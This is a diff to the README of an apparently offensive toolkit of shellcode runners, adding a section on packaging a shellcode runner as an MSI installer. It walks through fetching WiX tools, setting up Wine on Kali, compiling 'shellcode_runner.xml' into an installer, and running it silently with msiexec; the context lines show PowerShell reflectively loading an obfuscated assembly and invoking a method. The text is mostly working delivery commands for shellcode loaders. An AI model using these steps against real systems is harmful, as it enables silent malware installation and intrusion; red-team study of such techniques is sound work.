@@ -240,6 +240,51 @@ First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesa
  [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
  [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
 ```
+
+### 1.5 MSI
+
+**Download Wix binaries**
+If you want to update the wix binaries then use the url bellow. 
+```
+wget https://github.com/wixtoolset/wix3/releases/download/wix3112rtm/wix311-binaries.zip
+```
+
+**Install/Update Wine on KALI**
+```
+echo deb-src https://dl.winehq.org/wine-builds/debian/ buster main >> /etc/apt/sources.list
+apt update
+apt install winehq-stable
+winecfg
+```
+
+**Creating .wixobj file**
+```
+cd MSI/Wix311
+
+┌──(kali㉿kali)-[~/…/MSI/Wix311]
+└─$ ls -ltr
+total 14388
+-rw-r--r--  1 kali kali    3369 Sep 15  2019 LICENSE.TXT
+-rw-r--r--  1 kali kali  169832 Sep 15  2019 mergemod.dll
+-rw-r--r--  1 kali kali  501248 Sep 15  2019 mergemod.cub
+-rw-r--r--  1 kali kali    4233 Sep 15  2019 lux.targets
+-rw-r--r--  1 kali kali  694784 Sep 15  2019 darice.cub
+-rw-r--r--  1 kali kali   61952 Sep 15  2019 mspatchc.dll
+...
+```
+mono candle.exe -out ./ -arch x64 shellcode_runner.xml
+```
+
+**Generating .MSI**
+```
+wine light.exe -out calc.msi shellcode_runner.wixobj -sval
+```
+
+**Execution**
+```
+msiexec /q /i shellcode_runner.msi
+```
+
 ---
 ## 2. Execute .Net Assemblies with Reflection
 Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.
